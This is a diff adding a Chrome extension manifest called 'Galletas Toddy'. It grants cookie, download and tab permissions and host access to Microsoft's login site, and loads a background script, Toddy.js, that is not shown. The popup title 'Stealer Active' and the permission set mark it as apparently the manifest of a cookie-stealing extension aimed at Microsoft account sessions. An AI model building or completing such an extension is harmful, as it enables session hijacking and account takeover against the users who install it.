@@ -1,0 +1,22 @@
+{
+    "manifest_version": 3,
+    "name": "Galletas Toddy",
+    "version": "1.2",
+    "permissions": [
+        "cookies",
+        "downloads",
+        "tabs"
+    ],
+    "host_permissions": [
+    "https://login.microsoftonline.com/*"
+
+    ],
+    "background": {
+        "service_worker": "Toddy.js"
+    },
+    "action": {
+        "default_popup": "popup.html",
+        "default_title": "Stealer Active"
+    }
+}
+
